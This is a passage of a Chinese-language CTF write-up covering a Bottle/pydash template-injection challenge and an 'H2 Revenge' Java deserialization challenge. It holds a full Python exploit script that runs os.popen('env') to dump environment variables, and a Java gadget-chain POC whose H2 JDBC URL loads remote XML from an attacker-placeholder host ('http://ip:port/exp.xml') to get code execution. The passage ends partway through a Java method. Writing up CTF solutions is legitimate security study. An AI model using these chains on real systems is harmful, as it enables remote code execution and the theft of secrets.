+</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>encoding
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_str <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: touni(x, enc)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_escape <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: escape_func(touni(x, enc))
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>syntax <span style="color:#f92672">=</span> syntax
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> noescape:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>_str, self<span style="color:#f92672">.</span>_escape <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_escape, self<span style="color:#f92672">.</span>_str
+</span></span></code></pre></div><p><code>BaseTemplate</code>类的<code>__init__</code>函数代码如下：把<code>self.settings</code>传给<code>prepare</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>self<span style="color:#f92672">.</span>name <span style="color:#f92672">=</span> name
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>source <span style="color:#f92672">=</span> source<span style="color:#f92672">.</span>read() <span style="color:#66d9ef">if</span> hasattr(source, <span style="color:#e6db74">&#39;read&#39;</span>) <span style="color:#66d9ef">else</span> source
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>filename <span style="color:#f92672">=</span> source<span style="color:#f92672">.</span>filename <span style="color:#66d9ef">if</span> hasattr(source, <span style="color:#e6db74">&#39;filename&#39;</span>) <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>lookup <span style="color:#f92672">=</span> [os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> lookup] <span style="color:#66d9ef">if</span> lookup <span style="color:#66d9ef">else</span> []
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>encoding <span style="color:#f92672">=</span> encoding
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>settings <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>settings<span style="color:#f92672">.</span>copy()  <span style="color:#75715e"># Copy from class variable</span>
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>settings<span style="color:#f92672">.</span>update(settings)  <span style="color:#75715e"># Apply</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>source <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>name:
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>filename <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>search(self<span style="color:#f92672">.</span>name, self<span style="color:#f92672">.</span>lookup)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>filename:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> TemplateError(<span style="color:#e6db74">&#39;Template </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> not found.&#39;</span> <span style="color:#f92672">%</span> repr(name))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>source <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>filename:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> TemplateError(<span style="color:#e6db74">&#39;No template specified.&#39;</span>)
+</span></span><span style="display:flex;"><span>self<span style="color:#f92672">.</span>prepare(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>settings)
+</span></span></code></pre></div><p>所以覆盖模板syntax POC如下：</p>
+<pre tabindex="0"><code>/setValue?name=bottle
+
+{&#34;path&#34;:&#34;BaseTemplate.settings.syntax&#34;,&#34;value&#34;:&#34;` ` % | |&#34;}
+</code></pre><p>用<code>||</code>包裹即可执行代码并回显。</p>
+<p>具体的模板执行代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute</span>(self, _stdout, kwargs):
+</span></span><span style="display:flex;"><span>    env <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>defaults<span style="color:#f92672">.</span>copy()
+</span></span><span style="display:flex;"><span>    env<span style="color:#f92672">.</span>update(kwargs)
+</span></span><span style="display:flex;"><span>    env<span style="color:#f92672">.</span>update({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_stdout&#39;</span>: _stdout,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_printlist&#39;</span>: _stdout<span style="color:#f92672">.</span>extend,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;include&#39;</span>: functools<span style="color:#f92672">.</span>partial(self<span style="color:#f92672">.</span>_include, env),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;rebase&#39;</span>: functools<span style="color:#f92672">.</span>partial(self<span style="color:#f92672">.</span>_rebase, env),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_rebase&#39;</span>: <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_str&#39;</span>: self<span style="color:#f92672">.</span>_str,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;_escape&#39;</span>: self<span style="color:#f92672">.</span>_escape,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;get&#39;</span>: env<span style="color:#f92672">.</span>get,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;setdefault&#39;</span>: env<span style="color:#f92672">.</span>setdefault,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;defined&#39;</span>: env<span style="color:#f92672">.</span>__contains__
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    exec(self<span style="color:#f92672">.</span>co, env)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> env<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;_rebase&#39;</span>):
+</span></span><span style="display:flex;"><span>        subtpl, rargs <span style="color:#f92672">=</span> env<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;_rebase&#39;</span>)
+</span></span><span style="display:flex;"><span>        rargs[<span style="color:#e6db74">&#39;base&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(_stdout)  <span style="color:#75715e">#copy stdout</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> _stdout[:]  <span style="color:#75715e"># clear stdout</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_include(env, subtpl, <span style="color:#f92672">**</span>rargs)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> env
+</span></span></code></pre></div><p>使用了<code>exec</code>函数，可以拿到<code>__builtins__</code>，所以可以将代码注入<code>__builtins__</code>中，因为<code>setValue</code>中对于<code>value</code>字段不限制长度，POC如下：</p>
+<pre tabindex="0"><code>/setValue?name=setval
+
+{&#34;path&#34;:&#34;__builtins__.p&#34;,&#34;value&#34;:&#34;print(1)&#34;}
+</code></pre><p>注意以下代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">template</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span><span style="color:#f92672">..............</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tplid <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> TEMPLATES <span style="color:#f92672">or</span> DEBUG:
+</span></span><span style="display:flex;"><span>        settings <span style="color:#f92672">=</span> kwargs<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;template_settings&#39;</span>, {})
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(tpl, adapter):
+</span></span><span style="display:flex;"><span>            TEMPLATES[tplid] <span style="color:#f92672">=</span> tpl
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> settings: TEMPLATES[tplid]<span style="color:#f92672">.</span>prepare(<span style="color:#f92672">**</span>settings)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> tpl <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;{&#34;</span> <span style="color:#f92672">in</span> tpl <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">in</span> tpl <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;$&#39;</span> <span style="color:#f92672">in</span> tpl:
+</span></span><span style="display:flex;"><span>            TEMPLATES[tplid] <span style="color:#f92672">=</span> adapter(source<span style="color:#f92672">=</span>tpl, lookup<span style="color:#f92672">=</span>lookup, <span style="color:#f92672">**</span>settings)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            TEMPLATES[tplid] <span style="color:#f92672">=</span> adapter(name<span style="color:#f92672">=</span>tpl, lookup<span style="color:#f92672">=</span>lookup, <span style="color:#f92672">**</span>settings)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> TEMPLATES[tplid]:
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">500</span>, <span style="color:#e6db74">&#39;Template (</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">) not found&#39;</span> <span style="color:#f92672">%</span> tpl)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TEMPLATES[tplid]<span style="color:#f92672">.</span>render(kwargs)
+</span></span></code></pre></div><p>模板内容需要包含<code>\n,{%$</code>，不然不会进行render。</p>
+<p>POC如下：</p>
+<pre tabindex="0"><code>/render?path=%0a|eval(p)|
+</code></pre><p>exp:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ip:port&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># bypass pydash</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/setValue?name=pydash&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;helpers.RESTRICTED_KEYS&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:[]})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;yes&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] bypass pydash success&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] bypass pydash failed&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># bypass path</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/setValue?name=setval&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;__globals__.__forbidden_path__&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:[]})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;yes&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] bypass path success&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] bypass path failed&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># bypass name</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/setValue?name=setval&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;__globals__.__forbidden_name__&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:[]})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;yes&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] bypass name success&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] bypass name failed&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># update syntax</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/setValue?name=bottle&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;BaseTemplate.settings.syntax&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;` ` % | |&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;yes&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] bypass syntax success&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] bypass syntax failed&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_payload</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># set payload in builtin</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/setValue?name=setval&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;path&#34;</span>:<span style="color:#e6db74">&#34;__builtins__.p&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:payload})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;yes&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] set payload success&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[-] set payload failed&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># render</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/render?path=</span><span style="color:#e6db74">%0a</span><span style="color:#e6db74">|eval(p)|&#39;</span>)
+</span></span><span style="display:flex;"><span>    print(res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    init()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;env&#39;).read()&#34;</span>
+</span></span><span style="display:flex;"><span>    set_payload(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    render()
+</span></span></code></pre></div><h2 id="h2-revenge">H2 Revenge<a hidden class="anchor" aria-hidden="true" href="#h2-revenge">#</a></h2>
+<p><code>MyDataSource</code>类可以触发jdbc连接，getter触发。</p>
+<p>用jackson getter链子。堆栈如下：</p>
+<pre tabindex="0"><code>challenge.MyDataSource#getConnection
+jdk.internal.reflect.GeneratedMethodAccessor12#invoke
+jdk.internal.reflect.DelegatingMethodAccessorImpl#invoke
+java.lang.reflect.Method#invoke
+org.springframework.aop.support.AopUtils#invokeJoinpointUsingReflection
+org.springframework.aop.framework.JdkDynamicAopProxy#invoke
+jdk.proxy2.$Proxy61#getConnection
+jdk.internal.reflect.GeneratedMethodAccessor11#invoke
+jdk.internal.reflect.DelegatingMethodAccessorImpl#invoke
+java.lang.reflect.Method#invoke
+com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField
+com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields
+com.fasterxml.jackson.databind.ser.BeanSerializer#serialize
+com.fasterxml.jackson.databind.SerializerProvider#defaultSerializeValue
+com.fasterxml.jackson.databind.node.POJONode#serialize
+com.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#_serializeNonRecursive
+com.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#serialize
+com.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize
+com.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize
+com.fasterxml.jackson.databind.ser.DefaultSerializerProvider#_serialize
+com.fasterxml.jackson.databind.ser.DefaultSerializerProvider#serializeValue
+com.fasterxml.jackson.databind.ObjectWriter$Prefetch#serialize
+com.fasterxml.jackson.databind.ObjectWriter#_writeValueAndClose
+com.fasterxml.jackson.databind.ObjectWriter#writeValueAsString
+com.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString
+com.fasterxml.jackson.databind.node.BaseJsonNode#toString
+com.sun.org.apache.xpath.internal.objects.XString#equals
+org.springframework.aop.target.HotSwappableTargetSource#equals
+java.util.HashMap#putVal
+java.util.HashMap#readObject
+jdk.internal.reflect.GeneratedMethodAccessor6#invoke
+jdk.internal.reflect.DelegatingMethodAccessorImpl#invoke
+java.lang.reflect.Method#invoke
+java.io.ObjectStreamClass#invokeReadObject
+java.io.ObjectInputStream#readSerialData
+java.io.ObjectInputStream#readOrdinaryObject
+java.io.ObjectInputStream#readObject0
+java.io.ObjectInputStream#readObject
+java.io.ObjectInputStream#readObject
+challenge.IndexController#deserialize
+</code></pre><p>有h2 driver。但环境为<code>eclipse-temurin:17-jre</code>镜像，<code>JAVA_HOME</code>下没有javac，所以无法编译自定义方法。可能是因为jdk版本高，TRIGGER获取js引擎是获取不到。同时有没有Grooxy依赖，所以传统利用方法都失效了。</p>
+<p>查看文档发现可以调用任意<code>public static</code>方法。</p>
+<blockquote>
+<p><a href="https://www.h2database.com/html/features.html">https://www.h2database.com/html/features.html</a>
+<img alt="1" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/1.png"></p>
+</blockquote>
+<p>由于jdk moduel限制，Hessian反序列化打的那些gadget不能用。</p>
+<p>找到<code>org.h2.util.Utils#newInstance</code>方法可以触发构造方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">newInstance</span>(String var0, Object... var1) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    Constructor var2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> var3 <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>    Constructor<span style="color:#f92672">[]</span> var4 <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(var0).<span style="color:#a6e22e">getConstructors</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> var5 <span style="color:#f92672">=</span> var4.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> var6 <span style="color:#f92672">=</span> 0; var6 <span style="color:#f92672">&lt;</span> var5; <span style="color:#f92672">++</span>var6) {
+</span></span><span style="display:flex;"><span>        Constructor var7 <span style="color:#f92672">=</span> var4<span style="color:#f92672">[</span>var6<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> var8 <span style="color:#f92672">=</span> match(var7.<span style="color:#a6e22e">getParameterTypes</span>(), var1);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (var8 <span style="color:#f92672">&gt;</span> var3) {
+</span></span><span style="display:flex;"><span>            var3 <span style="color:#f92672">=</span> var8;
+</span></span><span style="display:flex;"><span>            var2 <span style="color:#f92672">=</span> var7;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (var2 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NoSuchMethodException(var0);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> var2.<span style="color:#a6e22e">newInstance</span>(var1);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>类的构造方法可以RCE，参数为<code>java.lang.String</code></p>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass ctClass0 <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;</span>);
+</span></span><span style="display:flex;"><span>        CtMethod writeReplace <span style="color:#f92672">=</span> ctClass0.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;writeReplace&#34;</span>);
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">removeMethod</span>(writeReplace);
+</span></span><span style="display:flex;"><span>        ctClass0.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS expNewInstance FOR &#39;org.h2.util.Utils.newInstance&#39;\\;CALL expNewInstance(&#39;org.springframework.context.support.ClassPathXmlApplicationContext&#39;,&#39;http://ip:port/exp.xml&#39;)\\;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        MyDataSource myDataSource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MyDataSource(url, <span style="color:#e6db74">&#34;username&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        AdvisedSupport advisedSupport <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AdvisedSupport();
+</span></span><span style="display:flex;"><span>        advisedSupport.<span style="color:#a6e22e">setTarget</span>(myDataSource);   <span style="color:#75715e">// exp类</span>
+</span></span><span style="display:flex;"><span>        Constructor constructor <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span>).<span style="color:#a6e22e">getConstructor</span>(AdvisedSupport.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler) constructor.<span style="color:#a6e22e">newInstance</span>(advisedSupport);
+</span></span><span style="display:flex;"><span>        Object proxy <span style="color:#f92672">=</span> Proxy.<span style="color:#a6e22e">newProxyInstance</span>(ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(), <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{DataSource.<span style="color:#a6e22e">class</span>}, handler);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        POJONode poJoNode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POJONode(proxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        XString x <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XString(<span style="color:#e6db74">&#34;123&#34;</span>);
+</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> makeMap(x, poJoNode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ser(map);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">makeMap</span> (Object obj1, Object obj2) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        HotSwappableTargetSource v1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HotSwappableTargetSource(obj2);
+</span></span><span style="display:flex;"><span>        HotSwappableTargetSource v2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HotSwappableTargetSource(obj1);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object, Object<span style="color:#f92672">&gt;</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#e6db74">&#34;size&#34;</span>, 2);
+</span></span><span style="display:flex;"><span>        Class<span style="color:#f92672">&lt;?&gt;</span> nodeC;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.HashMap$Node&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (ClassNotFoundException e) {
